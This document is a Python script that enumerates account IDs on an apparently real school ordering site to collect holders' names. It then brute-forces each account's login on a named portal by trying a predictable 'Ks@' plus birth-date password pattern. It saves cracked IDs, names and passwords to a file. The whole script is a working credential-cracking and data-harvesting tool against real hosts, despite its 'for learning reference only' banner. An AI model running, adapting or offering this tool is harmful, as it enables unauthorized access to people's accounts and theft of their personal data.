import traceback
import json
import requests
import re
from bs4 import BeautifulSoup
import sys
import np
import time
import pypinyin
from soupsieve.util import lower

print("华东开户学武系统 ver2.0 by Idad Wind in Python")
print("For learning reference only, not abusing, or you will take the risk!")
print()
min_id = int(input("min id: "))
max_id = int(input("max id: "))
min_year = int(input("min year: "))
max_year = int(input("max year: "))
output = input("output file: ")
print()
def getAPI(get_id):
    try:
        req = requests.get("https://ordering.kcisec.com/chaxun.asp?kahao=" + get_id)
        reqt = req.text.encode('iso-8859-1').decode('gbk')
        soup = BeautifulSoup(reqt, 'html.parser')
        body = soup.body
        table = body.find('table', width='800')
        td = table.find('td', align='center', valign='top')
        span = td.find('span')
        span_text = span.text
        if span is None or span_text == "无此帐户，或帐户已被锁定！":
            return
        name = re.sub(r"\[.*?\](.+?) \d{4}/\d{1,2}/\d{1,2}.{4}", r"\1", span_text)
        #print("Get " + get_id + " = " + name)
        return name
    except Exception as ex:
        traceback.print_exc()
        #print("Error occurred when get API!")
        return
def getPassword(q_id,min_year,max_year):
    url = "http://portal.kcistz.org.cn/DSAI/Account/LogInCheck"
    headers = {"Accept-Language" : "en-US,en;q=0.9"}
    for yrs in range(min_year,max_year+1):
        for mth in range(1,13):
            mth_p = "Ks@" + str(yrs) + str(mth).zfill(2)
            for days in range(1,32):
                password = mth_p + str(days).zfill(2)
                print("\rAttempting password of " + q_id + ": " + password, end=" "*20)
                d = {"UserID" : q_id, "Password" : password, "returnUrl" : ""}    
                r = requests.post(url, data=d, headers=headers)
                dic = json.loads(r.text)
                if dic[0]["strStatus"] == "{ok}":
                    #print("successfully finished")
                    return password
    return
def getTimeString(time):
    if time == 0:
        return "Calculating"
    if time < 1000:
        return str(time) + "ms"
    elif time < 60000:
        return str(time / 1000) + "s"
    elif time < 3600000:
        return str(time / 60000) + "min"
    else:
        return str(time / 3600000) + "h"
total = max_id-min_id+1
start_time = time.time()
proceeded = 0
with open(output, "a", encoding="utf-8") as f:
    for i in range(min_id, max_id+1):
        speed = 0
        if proceeded != 0:
            speed = int(round(time.time()*1000 - start_time*1000) / proceeded)
        percentage = ""
        if total == 0:
            percentage = "100"
        else:
            percentage = str(round((i - min_id) / total, 4)*100)
            percentage_str = percentage.split('.')[0] + '.' + percentage.split('.')[1][:2]
        res = str_i = str(i)
        name = getAPI(str_i)
        print("\rCurrent processing: {} - {} - {}% - Time remaining: {}".format(str_i, name, percentage_str, getTimeString(round(speed * (total - proceeded)))), end=" "*20)
        if name != None:
            res += " - " + name
            #print("Current cracking " + name + " - " + str_i)
            name_py = pypinyin.slug(name, style=pypinyin.Style.NORMAL, separator=' ')
            res += " - " + name_py
            #print("As in pinying: " + name_py)
            #print("Cracking password of " + str_i)
            print()
            password = getPassword(str_i, min_year, max_year)
            if password == None:
                print("\rUnable to crack" + str_i + "! Skip password", end = "\033[1A" + " "*20)
            else:
                print("\rCracked " + str_i + " - " + name, end = "\033[1A" + " "*30)
                res += " - " + password
            f.write(res + "\n")
        proceeded += 1